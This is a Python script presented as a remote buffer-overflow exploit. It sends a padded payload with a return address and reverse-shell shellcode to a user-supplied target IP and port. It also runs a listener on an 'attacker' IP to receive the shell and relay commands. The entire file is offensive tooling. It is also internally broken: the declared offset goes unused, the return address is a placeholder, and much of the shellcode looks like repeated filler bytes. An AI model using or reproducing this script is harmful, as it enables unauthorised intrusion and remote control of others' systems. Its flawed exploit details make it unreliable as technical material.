import socket
import threading
import sys
import time

def start_listener(attacker_ip, attacker_port):
    """Starts a listener to receive a reverse shell."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((attacker_ip, attacker_port))
    listener.listen(1)
    print(f"[*] Listening for incoming connections on {attacker_ip}:{attacker_port}...")
    
    conn, addr = listener.accept()
    print(f"[*] Connection established from {addr}.")
    
    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            break
        if command:
            conn.send(command.encode())
            response = conn.recv(4096).decode()
            print(response)

    conn.close()
    listener.close()

def exploit(target_ip, target_port, attacker_ip, attacker_port):
    # Exploit parameters (adjust based on target)
    buffer_size = 512  # Size of the vulnerable buffer
    offset = 524  # Offset to the return address
    jmp_esp = 0x12345678  # Replace with actual JMP ESP address
    padding = "A" * buffer_size  # Padding to fill the buffer

    # Shellcode for reverse TCP shell (replace with actual generated shellcode)
    shellcode = (
        b"\xbb\x0b\xae\xba\x9b\xdb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31"
        b"\x7a\x17\x83\xea\xfc\x03\x7a\x5d\x2c\x81\x8e\x57\x55\x59\x15\x4b"
        b"\x6e\x65\x25\x68\x71\x57\xe7\x2c\x02\x47\x53\x26\x94\x67\x6c\x3a"
        b"\x81\x90\x48\xca\xe8\x2c\x25\xf3\x95\x6b\x6b\x61\x67\x90\x74\x12"
        b"\x4b\x64\x67\x72\x3a\x42\x70\x74\x3a\x05\x75\xd9\x93\x6c\x3a\x22"
        b"\x76\x6d\x71\x56\x26\x95\x4b\x63\x67\x72\x0c\x4b\x75\x46\x67\x77"
        b"\x56\x93\x4b\x6f\x47\x72\x74\x0c\x4b\x77\x46\x73\x36\x96\x4b\x74"
        b"\x46\x63\x36\x02\x4a\x26\xbb\xba\x4b\x77\x42\x70\x36\x95\x6b\x6b"
        b"\x61\x67\x90\x0a\x05\x66\x61\x05\x64\x4b\x70\x74\x0c\x4b\x6f\x47"
        b"\x72\x74\x0c\x4b\x77\x46\x73\x36\x96\x57\x6a\x64\x05\x66\x67\x3a"
        b"\x42\x70\x74\x3a\x05\x75\xd9\x97\x4b\x64\x47\x62\x3a\x81\x90\x73"
        b"\x2a\xe8\x2c\x27\x63\x95\x4b\x63\x67\x72\x0c\x4b\x75\x46\x67\x77"
        b"\x56\x93\x4b\x6f\x47\x72\x74\x0c\x4b\x77\x46\x73\x36\x96\x4b\x74"
        b"\x46\x63\x36\x02\x4a\x26\x94\x57\x6a\x3a\x81\x90\x72\xca\xe8\x2c"
        b"\x25\x63\x95\x6b\x6b\x61\x67\x90\x0c\x05\x42\x70\x05\x77\x4b\x70"
        b"\x74\x0c\x4b\x6f\x47\x72\x74\x0c\x4b\x77\x46\x73\x36\x96\x4b\x74"
        b"\x46\x63\x36\x02\x4a\x26\xbb\xba\x4b\x77\x42\x70\x36\x95\x6b\x6b"
        b"\x61\x67\x90"
    )

    # Construct the return address (jmp esp)
    ret_address = jmp_esp.to_bytes(4, byteorder='little')

    # Craft the exploit payload
    payload = padding.encode() + ret_address + shellcode

    try:
        # Create a socket and connect to the target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Send the payload
        s.send(payload)
        print("Exploit sent!")

        s.close()

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ")
    target_port = int(input("Enter Target Port: "))
    attacker_ip = input("Enter Attacker IP: ")
    attacker_port = int(input("Enter Attacker Port: "))

    # Start listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, args=(attacker_ip, attacker_port))
    listener_thread.start()

    # Wait for a moment to ensure listener is ready
    time.sleep(2)

    # Run the exploit
    exploit(target_ip, target_port, attacker_ip, attacker_port)
